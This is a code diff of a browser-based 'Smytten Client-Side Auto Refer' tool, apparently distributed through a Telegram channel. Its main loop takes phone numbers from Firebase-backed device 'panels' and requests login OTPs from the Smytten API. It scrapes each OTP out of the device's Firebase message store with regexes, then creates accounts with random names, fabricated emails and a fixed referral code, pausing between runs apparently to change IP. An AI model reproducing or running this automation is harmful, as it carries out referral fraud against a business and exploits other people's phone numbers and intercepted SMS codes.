+            let mm = body.match(/(\d{4,6})\s+is your.*?(?:verification|otp|code)/i); if(mm) return mm[1];
+            mm = body.match(/(?:otp|code)[:\s]*(\d{4,6})/i); if(mm) return mm[1];
+            mm = body.match(/(?<!\d)(\d{6})(?!\d)/); if(mm) return mm[1];
+            mm = body.match(/(?<!\d)(\d{4})(?!\d)/); if(mm) return mm[1];
           }
         }
       }
@@ -781,22 +711,14 @@ async function fetchOtpFromFirebase(firebaseUrl, clientId, triggerMs){
   return null;
 }
 
-/* ================= FIREBASE AUTO RUNNER ================= */
 async function startFirebaseAuto(){
   if(fbAutoRunning) return;
-
   if(!panels.length){ log('✗ Add at least one panel','err'); return; }
-
-  // Scan if no devices loaded yet
   if(!fbDevices.length){
-    log('📡 No devices loaded — scanning first…', 'info');
-    await scanAllPanels();
+    log('📡 No devices loaded — scanning first…', 'info'); await scanAllPanels();
     if(!fbDevices.length){ log('✗ No devices found. Check panels or try later.','err'); return; }
   }
-
-  if(!fbDevices.some(d => d.phone && !fbUsedPhones.has(d.phone))){
-    log('✗ All devices already used. Add fresh panels or wait.','err'); return;
-  }
+  if(!fbDevices.some(d => d.phone && !fbUsedPhones.has(d.phone))){ log('✗ All devices already used.','err'); return; }
 
   fbAutoRunning = true; stopping = false;
   document.getElementById('btnFbAuto').classList.add('hidden');
@@ -809,62 +731,32 @@ async function startFirebaseAuto(){
   const target = parseInt(document.getElementById('fbTarget').value, 10) || 3;
   let success = 0;
 
-  log(`🚀 Auto start | ref=${ref} | target=${target} | panels=${panels.length}`, 'info');
-  setStatus('Running','pending');
+  log(`🚀 Auto start | ref=${ref} | target=${target} | panels=${panels.length}`, 'info'); setStatus('Running','pending');
 
   while(success < target && !stopping){
-    // find next available device (not used, not busy)
     let dev = fbDevices.find(d => d.phone && !fbUsedPhones.has(d.phone) && !d._busy);
-
     if(!dev){
-      log('🔄 Pool empty — refreshing all panels…','warn');
-      await refreshPoolIfNeeded();
+      log('🔄 Pool empty — refreshing all panels…','warn'); await refreshPoolIfNeeded();
       dev = fbDevices.find(d => d.phone && !fbUsedPhones.has(d.phone) && !d._busy);
-      if(!dev){
-        log('✗ No more devices available. Stopping.','err');
-        break;
-      }
+      if(!dev){ log('✗ No more devices available. Stopping.','err'); break; }
     }
 
-    dev._busy = true;
-    renderDevices();
-
+    dev._busy = true; renderDevices();
     try{
       const trigger = Date.now();
       log(`📱 +91${dev.phone} [${shortUrl(dev.firebase_url)}] → Sending OTP…`);
-
-      const sr = await apiPost('/discover_user/users/loginViaNumberV2', makeDevicePayload(dev.phone), makeHeaders());
-
-      if(sr.data){
-        const isNew = sr.data.content?.is_new_user ?? sr.data.content?.newUser;
-        if(isNew === false){
-          log(`✗ +91${dev.phone} already registered — skip`,'warn');
-          fbUsedPhones.add(dev.phone); dev._busy = false;
-          renderDevices();
-          continue;
-        }
-      }
+      await apiPost('/discover_user/users/loginViaNumberV2', makeDevicePayload(dev.phone), makeHeaders());
 
       log(`⏳ Polling ${shortUrl(dev.firebase_url)} messages/${dev.client_id.slice(0,10)}…`);
       const otp = await fetchOtpFromFirebase(dev.firebase_url, dev.client_id, trigger);
-      if(!otp){
-        log(`✗ +91${dev.phone} OTP timeout`,'err');
-        fbUsedPhones.add(dev.phone); dev._busy = false;
-        renderDevices();
-        continue;
-      }
+      if(!otp){ log(`✗ +91${dev.phone} OTP timeout`,'err'); fbUsedPhones.add(dev.phone); dev._busy = false; renderDevices(); continue; }
       log(`✓ OTP: ${otp}`, 'ok');
 
-      const vp = makeDevicePayload(dev.phone);
-      vp.login_otp_code = String(otp);
-      vp.recaptcha_token = "";
-      vp.is_mini = false;
+      const vp = makeDevicePayload(dev.phone); vp.login_otp_code = String(otp); vp.recaptcha_token = ""; vp.is_mini = false;
       const vr = await apiPost('/discover_user/users/verifyLoginOtpV2', vp, makeHeaders());
       if(!vr.data || vr.data.response?.error !== 0){
         log(`✗ +91${dev.phone} verify failed: ${vr.data?.response?.message || 'unknown'}`, 'err');
-        fbUsedPhones.add(dev.phone); dev._busy = false;
-        renderDevices();
-        continue;
+        fbUsedPhones.add(dev.phone); dev._busy = false; renderDevices(); continue;
       }
       const content = vr.data.content || {};
       sessionId = content.session_id || content.authentication?.session_id;
@@ -875,13 +767,8 @@ async function startFirebaseAuto(){
       const [first, last] = randomName();
       const email = `${first.toLowerCase()}${dev.phone}@gmail.com`;
       const pr = await apiPost('/discover_user/app/users/update_profile', {
-        pincode: "110029",
-        gender: "male",
-        birth_month: Math.floor(Math.random()*12)+1,
-        name: first.toUpperCase(),
-        email: email,
-        birth_year: String(1996 + Math.floor(Math.random()*8)),
-        invite_code: ref
+        pincode: "110029", gender: "male", birth_month: Math.floor(Math.random()*12)+1, name: first.toUpperCase(),
+        email: email, birth_year: String(1996 + Math.floor(Math.random()*8)), invite_code: ref
       }, makeHeaders(sessionId, "18"), 'PUT');
 
       if(pr.ok && (pr.data?.response?.error === 0 || pr.data?.content)){
@@ -891,21 +778,10 @@ async function startFirebaseAuto(){
         log(`⚠ +91${dev.phone} profile update failed (HTTP ${pr.status})`, 'warn');
       }
 
-      fbUsedPhones.add(dev.phone); dev._busy = false;
-      renderDevices();
-      renderPanels();
+      fbUsedPhones.add(dev.phone); dev._busy = false; renderDevices(); renderPanels();
 
-      // Airplane pause between attempts
-      if(success < target && !stopping){
-        triggerAirplane(4500);
-        await new Promise(r => setTimeout(r, 5000));
-      }
-
-    }catch(e){
-      log(`✗ ${e.message}`, 'err');
-      dev._busy = false;
-      renderDevices();
-    }
+      if(success < target && !stopping){ triggerAirplane(4500); await new Promise(r => setTimeout(r, 5000)); }
+    }catch(e){ log(`✗ ${e.message}`, 'err'); dev._busy = false; renderDevices(); }
   }
 
   fbAutoRunning = false;
@@ -919,23 +795,16 @@ async function startFirebaseAuto(){
 }
 
 function triggerAirplane(ms){
-  showAirplane(true);
-  const bar = document.getElementById('airplaneBar');
-  bar.style.width = '0%';
+  showAirplane(true); const bar = document.getElementById('airplaneBar'); bar.style.width = '0%';
   const start = Date.now();
   const iv = setInterval(() => {
-    const p = Math.min(100, Math.round((Date.now()-start)/ms*100));
-    bar.style.width = p + '%';
+    const p = Math.min(100, Math.round((Date.now()-start)/ms*100)); bar.style.width = p + '%';
     if(p >= 100){ clearInterval(iv); showAirplane(false); log('✓ Airplane pause done','ok'); }
   }, 150);
 }
 
-/* ================= STOP ================= */
 function stopAll(){
-  stopping = true;
-  fbAutoRunning = false;
-  setStatus('Stopped','blocked');
-  log('■ Stopped by user','warn');
+  stopping = true; fbAutoRunning = false; setStatus('Stopped','blocked'); log('■ Stopped by user','warn');
   document.getElementById('btnFbAuto').classList.remove('hidden');
   document.getElementById('btnFbStop').classList.add('hidden');
   document.getElementById('btnFbScan').disabled = false;
@@ -943,31 +812,16 @@ function stopAll(){
   document.getElementById('btnClearPanels').disabled = false;
 }
 
-/* ================= IP CHECK ================= */
 async function checkMyIP(){
-  try{
-    const r = await fetch('https://api.ipify.org?format=json');
-    const j = await r.json();
-    setIP(j.ip || '?', 'ip');
-    log(`🌐 Your public IP: ${j.ip}`, 'info');
-  }catch(e){
-    try{
-      const r = await fetch('https://ipapi.co/json/');
-      const j = await r.json();
-      setIP(j.ip || '?', 'ip');
-      log(`🌐 Your public IP: ${j.ip}`, 'info');
-    }catch(e2){
-      setIP('unknown','blocked');
-    }
-  }
+  try{ const r = await fetch('https://api.ipify.org?format=json'); const j = await r.json(); setIP(j.ip || '?', 'ip'); log(`🌐 Your public IP: ${j.ip}`, 'info'); }
+  catch(e){ try{ const r = await fetch('https://ipapi.co/json/'); const j = await r.json(); setIP(j.ip || '?', 'ip'); log(`🌐 Your public IP: ${j.ip}`, 'info'); }catch(e2){ setIP('unknown','blocked'); } }
 }
 
-/* ================= INIT ================= */
 checkMyIP();
-renderPanels();
-renderDevices();
+renderPanels(); renderDevices();
 log('Smytten Client-Side Auto Refer ready','info');
-log('Multi-panel: paste URLs line-by-line → Add → Scan → Start','sys');
+log('Telegram Channel @roodrop connect ho gaya hai','ok');
+log('Default Refer Code: ugbO7ND','sys');
 </script>
 </body>
 </html>
